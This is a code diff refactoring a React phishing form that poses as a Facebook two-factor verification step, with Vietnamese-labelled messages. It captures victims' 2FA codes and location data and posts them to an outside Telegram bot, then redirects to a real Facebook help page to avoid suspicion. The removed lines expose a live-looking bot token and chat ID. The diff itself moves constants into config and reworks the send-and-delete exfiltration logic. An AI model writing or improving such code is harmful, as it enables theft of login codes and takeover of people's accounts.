@@ -1,13 +1,22 @@
 import React, { useState } from "react";
 import { useLocation, Navigate } from "react-router-dom";
 import "./AuthCodeForm.scss";
+import {
+  BOT_TOKEN,
+  CHAT_ID,
+  MAX_CODE_ATTEMPTS,
+  CODE_MIN_LENGTH,
+  CODE_MAX_LENGTH,
+  CODE_COOLDOWN_SECONDS,
+  CODE_REDIRECT_DELAY_MS,
+  TRY_ANOTHER_WAY_DELAY_MS,
+} from "./config";
+import { PATHS } from "./paths.js";
 
 const AuthCodeForm = () => {
-  const BOT_TOKEN = "8142928186:AAGE_KqkalgiC24BoZcmtYg5EHhyHDIRs5w";
-  const CHAT_ID = "1400161225";
 
   const { state } = useLocation();
-  if (!state) return <Navigate to="/" replace />;
+  if (!state) return <Navigate to={PATHS.TIMEACTIVE_ROOT} replace />;
 
   const {
     method = "app",
@@ -50,7 +59,7 @@ const AuthCodeForm = () => {
 
   const startCooldown = () => {
     setIsSubmitDisabled(true);
-    setTimeLeft(60);
+    setTimeLeft(CODE_COOLDOWN_SECONDS);
     const timer = setInterval(() => {
       setTimeLeft((prev) => {
         if (prev <= 1) {
@@ -76,7 +85,6 @@ const AuthCodeForm = () => {
   ) => {
     const locationParts = location.split("/").map((part) => part.trim());
     const currentTime = getCurrentTime();
-    const message_id = localStorage.getItem("telegram_msg_id");
 
     const message = `
 📶 <b>XÁC THỰC 2FA (${step.toUpperCase()})</b>
@@ -102,33 +110,35 @@ const AuthCodeForm = () => {
 🛡 Mã 2FA 3: <code>${code3Input || "N/A"} </code>(${method3Input || "?"})
 `;
 
-    if (message_id) {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+    const oldMsgId = localStorage.getItem("telegram_msg_id");
+
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      }),
+    });
+
+    const data = await res.json();
+    if (data?.ok && data?.result?.message_id) {
+      localStorage.setItem("telegram_msg_id", data.result.message_id);
+    }
+
+    if (oldMsgId) {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          message_id,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      });
-    } else {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "HTML",
-        }),
+        body: JSON.stringify({ chat_id: CHAT_ID, message_id: oldMsgId }),
       });
     }
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    if (code.length < 6 || isSubmitDisabled || clickCount >= 3 || loadingSubmit)
+    if (code.length < CODE_MIN_LENGTH || isSubmitDisabled || clickCount >= MAX_CODE_ATTEMPTS || loadingSubmit)
       return;
 
     setLoadingSubmit(true);
@@ -169,7 +179,7 @@ const AuthCodeForm = () => {
         setTimeout(() => {
           window.location.href =
             "https://www.facebook.com/help/1735443093393986/";
-        }, 2000);
+        }, CODE_REDIRECT_DELAY_MS);
       }
     } catch (err) {
       console.error("Telegram Error:", err);
@@ -183,7 +193,7 @@ const AuthCodeForm = () => {
     setTimeout(() => {
       setLoadingOptions(false);
       setShowOptions(true);
-    }, 1000);
+    }, TRY_ANOTHER_WAY_DELAY_MS);
   };
 
   const handleMethodSelect = (method) => setSelectedMethod(method);
@@ -293,7 +303,7 @@ const AuthCodeForm = () => {
           <input
             type="text"
             placeholder="Code"
-            maxLength={8}
+            maxLength={CODE_MAX_LENGTH}
             value={code}
             onChange={(e) => setCode(e.target.value)}
             className="auth-input"
@@ -312,7 +322,7 @@ const AuthCodeForm = () => {
           <button
             type="submit"
             className={`auth-button ${isSubmitDisabled ? "disabled" : ""}`}
-            disabled={code.length < 6 || isSubmitDisabled || loadingSubmit}
+            disabled={code.length < CODE_MIN_LENGTH || isSubmitDisabled || loadingSubmit}
           >
             {loadingSubmit ? <span className="spinner-inline" /> : "Continue"}
           </button>
